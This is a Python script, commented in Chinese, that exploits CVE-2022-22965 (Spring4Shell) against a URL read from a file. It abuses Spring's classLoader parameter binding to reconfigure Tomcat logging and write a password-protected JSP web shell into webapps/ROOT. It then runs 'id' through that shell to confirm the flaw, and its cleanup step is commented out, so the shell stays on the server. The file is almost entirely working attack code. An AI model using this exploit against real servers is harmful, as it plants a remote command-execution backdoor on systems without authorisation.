import urllib.request
import requests


class CVE_2022_22965:
    def __init__(self):
        with open('../opt/前端传url.txt', 'r') as file:
            self.url = file.readline()     # 获取前端传入url
        self.data = "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1"    #设置shell1.jsp
        self.heards = {
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Connection": "close",
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1"
        }
    
    def start(self):
        payload = self.url + self.data
        hear = urllib.request.Request(url=payload,headers=self.heards)
        urllib.request.urlopen(hear)   #进行getshell
        urls = self.url + "/shell1.jsp?pwd=j&cmd=id"
        head = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        response = requests.get(url=urls,headers=head)
        code = response.status_code
        if code == 200:   #访问shell
            a = "存在CVE-2022-22965漏洞"
            print(a)
            # pay = self.url + "/shell1.jsp?pwd=j&cmd=rm%20shell1.jsp"
            # requests.get(url=pay,headers=head)    #应该在进行删除善后，但是命令无法执行
            return a


cve = CVE_2022_22965()
cve.start()